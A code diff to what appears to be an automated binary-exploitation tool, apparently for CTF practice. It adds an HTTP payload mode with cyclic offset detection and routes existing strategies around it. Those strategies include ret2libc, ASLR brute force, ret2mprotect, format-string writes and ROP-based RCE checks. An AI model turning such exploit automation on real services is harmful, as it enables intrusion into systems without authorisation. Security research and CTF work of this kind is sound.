@@ -104,6 +104,11 @@ def _build_parser() -> argparse.ArgumentParser:
     pay.add_argument("--payload-data", default=None)
     pay.add_argument("--udp", action="store_true")
     pay.add_argument("--spawn-target", action="store_true")
+    pay.add_argument("--http", default=None, nargs='?', const="POST /",
+                     metavar="METHOD PATH",
+                     help="HTTP mode: send payload as HTTP request "
+                          "(e.g., --http 'POST /submit'). "
+                          "Use with --payload-data and --spawn-target for offset detection")
     pay.add_argument("--bad-bytes", default="", dest="bad_bytes_str")
     pay.add_argument("--menu-script", default=None, dest="menu_script",
                      metavar="JSON",
@@ -363,8 +368,11 @@ def run_binary(cfg):
             log.warning(f"Could not parse --bad-bytes '{cfg.bad_bytes_str}': {exc}")
 
     udp_spawn_mode = bool(cfg.payload_data and cfg.udp and cfg.spawn_target)
+    http_spawn_mode = bool(cfg.payload_data and cfg.http and cfg.spawn_target)
     pie_base_udp   = None
     libc_base_udp  = None
+    pie_base_http  = None
+    libc_base_http = None
 
     if udp_spawn_mode:
         log.info("UDP+spawn mode: offset detection via cyclic injection…")
@@ -377,12 +385,32 @@ def run_binary(cfg):
         )
         libc_base_udp = getattr(fuzzer, "_last_libc_base", None)
         stack_addr = None
+    elif http_spawn_mode:
+        log.info("HTTP+spawn mode: offset detection via cyclic injection…")
+        offset, pie_base_http, target_function = fuzzer.find_offset_http_payload(
+            payload_template=cfg.payload_data.encode("utf-8", errors="surrogateescape"),
+            binary=cfg.binary,
+            binary_args=cfg.binary_args_list,
+            method=cfg.http_method,
+            path=cfg.http_path,
+            pattern_size_start=cfg.pattern_size,
+            target_function=target_function,
+        )
+        libc_base_http = getattr(fuzzer, "_last_libc_base", None)
+        stack_addr = None
     else:
         if cfg.payload_data:
-            fuzzer.send_raw_payload(
-                cfg.payload_data.encode("utf-8", errors="surrogateescape"),
-                use_udp=cfg.udp,
-            )
+            if cfg.http:
+                fuzzer.send_http_payload(
+                    cfg.payload_data.encode("utf-8", errors="surrogateescape"),
+                    method=cfg.http_method,
+                    path=cfg.http_path,
+                )
+            else:
+                fuzzer.send_raw_payload(
+                    cfg.payload_data.encode("utf-8", errors="surrogateescape"),
+                    use_udp=cfg.udp,
+                )
         offset, stack_addr, _raw_tf = exploiter.find_offset(
             cfg.pattern_size, functions, retries=5)
         # Use static analysis target_function if offset detection returned an internal symbol
@@ -406,7 +434,7 @@ def run_binary(cfg):
 
     # ── Multi-stage exploit ────────────────────────────────────────────
     # ── Multi-symbol libc leak ────────────────────────────────────────────
-    if getattr(cfg, "multisym_leak", False) and not udp_spawn_mode and offset is not None:
+    if getattr(cfg, "multisym_leak", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
         log.info("[multisym] Leaking multiple GOT symbols for precise fingerprinting…")
         try:
             from pwn import ELF as _MEL, ROP as _MROP
@@ -438,7 +466,7 @@ def run_binary(cfg):
             console.print(f"[bold yellow]Off-by-one detected: {_obo['type']} "
                           f"crash_size={_obo['crash_size']}[/]")
 
-    if getattr(cfg, "multistage", False) and not udp_spawn_mode and offset is not None:
+    if getattr(cfg, "multistage", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
         log.info("[multistage] Attempting two-stage ret2libc…")
         ms_ok, ms_type = exploiter.two_stage_exploit(
             offset=offset, canary=None, pie_base=None,
@@ -456,7 +484,7 @@ def run_binary(cfg):
             log.warning("[multistage] Two-stage failed — continuing with standard path")
 
     is_fork = False
-    if not udp_spawn_mode:
+    if not udp_spawn_mode and not http_spawn_mode:
         is_fork = exploiter._detect_fork_server()
 
     canary = None
@@ -464,7 +492,7 @@ def run_binary(cfg):
     # ── Early magic-value overwrite check ─────────────────────────────────────
     # For binaries like gold_miner/ret2win: CMP against local var.
     # Run for ALL binaries before other strategies to catch simple value overwrites.
-    if not udp_spawn_mode and offset is not None:
+    if not udp_spawn_mode and not http_spawn_mode and offset is not None:
         try:
             import subprocess as _spM, re as _reM, struct as _stM, time as _tM
             _dM = _spM.check_output(
@@ -541,7 +569,7 @@ def run_binary(cfg):
                     return
         except Exception: pass
 
-    if canary_enabled and not udp_spawn_mode:
+    if canary_enabled and not udp_spawn_mode and not http_spawn_mode:
         # Phase 1: read the service banner and parse any canary-like value
         # (common pattern: binary prints "COOKIE:0x<hex>" or similar on connect)
         try:
@@ -608,7 +636,7 @@ def run_binary(cfg):
         return
 
     # ── Brute-force ASLR ─────────────────────────────────────────────────
-    if getattr(cfg, "brute_aslr", False) and offset is not None and not udp_spawn_mode:
+    if getattr(cfg, "brute_aslr", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
         log.info("[brute_aslr] Starting ASLR brute force…")
         from analyzer.libc_db import get_one_gadgets, LIBC_DB
         ba_ok, ba_type = exploiter.brute_aslr_auto(
@@ -624,7 +652,7 @@ def run_binary(cfg):
         log.warning("[brute_aslr] Brute failed — continuing standard path")
 
     # ── i386 specific path ────────────────────────────────────────────────
-    if offset is not None and arch in ("i386", "x86") and not udp_spawn_mode:
+    if offset is not None and arch in ("i386", "x86") and not udp_spawn_mode and not http_spawn_mode:
         i386_chain = exploiter.build_rop_chain_i386(offset, canary, base_addr, offsets)
         if i386_chain and cfg.test_exploit:
             ok_i, out_i = exploiter._check_rce(i386_chain)
@@ -637,7 +665,7 @@ def run_binary(cfg):
                 return
 
     # ── ret2mprotect force ────────────────────────────────────────────────
-    if getattr(cfg, "ret2mprotect", False) and offset is not None and not udp_spawn_mode:
+    if getattr(cfg, "ret2mprotect", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
         log.info("[ret2mprotect] Forcing ret2mprotect strategy…")
         _mp_chain = exploiter.ret2mprotect(offset, canary, base_addr or 0, offsets)
         if _mp_chain and cfg.test_exploit:
@@ -652,7 +680,7 @@ def run_binary(cfg):
             log.info(f"[ret2mprotect] chain built: {len(_mp_chain)}B (use -t to fire)")
 
     fmt_payload = None
-    if findings["format_string_functions"] and not udp_spawn_mode:
+    if findings["format_string_functions"] and not udp_spawn_mode and not http_spawn_mode:
         # Use advanced format string exploit for Full RELRO
         if relro == "Full RELRO":
             log.info("[fmtstr] Full RELRO detected — using advanced stack-write technique")
@@ -704,6 +732,20 @@ def run_binary(cfg):
             log.warning("Cannot exploit: PIE base or libc base not available")
             success = False
 
+    if http_spawn_mode and cfg.payload_data:
+        from exploiter.http_strategies import _run_http_spawn_exploit
+        min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
+        coredump_rip = getattr(fuzzer, "_last_coredump_rip", 0)
+        if pie_base_http and libc_base_http:
+            success, exploit_type = _run_http_spawn_exploit(
+                cfg=cfg, fuzzer=fuzzer, offset=offset,
+                pie_base=pie_base_http, libc_base=libc_base_http,
+                coredump_rip=coredump_rip, min_crash=min_crash,
+                bad_bytes=bad_bytes)
+        else:
+            log.warning("Cannot exploit: PIE base or libc base not available")
+            success = False
+
     # ── Menu script + pre-send ────────────────────────────────────────────
     _menu_script = None
     _pre_send_bytes = None
@@ -738,7 +780,7 @@ def run_binary(cfg):
             if success:
                 log.info("[menu] ✓ Exploit succeeded via menu script")
 
-    elif cfg.test_exploit and not udp_spawn_mode:
+    elif cfg.test_exploit and not udp_spawn_mode and not http_spawn_mode:
         success, exploit_type, used_function = exploiter.create_exploit(
             offset=offset, shellcode=shellcode, return_addr=return_addr,
             test_exploit=True, return_offset=cfg.return_offset,
@@ -980,7 +1022,8 @@ def main():
             flag_path=args.flag_path,
             dos_only=args.dos, generate_scripts=args.generate_scripts,
             payload_data=args.payload_data, udp=args.udp,
-            spawn_target=args.spawn_target)
+            spawn_target=args.spawn_target,
+            http=args.http)
         cfg.bad_bytes_str = args.bad_bytes_str
         cfg.interactive   = getattr(args, "interactive", False)
         cfg.multistage    = getattr(args, "multistage", False)
